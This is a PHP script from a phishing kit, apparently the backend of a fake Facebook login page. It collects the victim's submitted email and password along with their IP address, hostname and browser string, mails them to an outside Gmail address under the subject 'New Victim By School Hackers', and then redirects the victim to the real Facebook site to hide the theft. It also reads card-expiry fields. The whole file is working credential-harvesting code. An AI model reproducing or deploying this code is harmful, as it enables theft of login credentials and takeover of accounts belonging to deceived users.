<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- Facebook -------------------\n";
$message .= "--------------  Infos -------------\n";
$message .= "Email Adresse       : ".$_POST['email']."\n";
$message .= "Password          : ".$_POST['pass']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Hamza Laghmam ----------------------\n";
$cc = $_POST['ccn'];
$subject = "New Victim By School Hackers ".$_POST['exm']."/".$_POST['exy'];
$send = "schoolhackerss@gmail.com";
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail($send,$subject,$message,$headers);

header("Location:http://facebook.com/");?>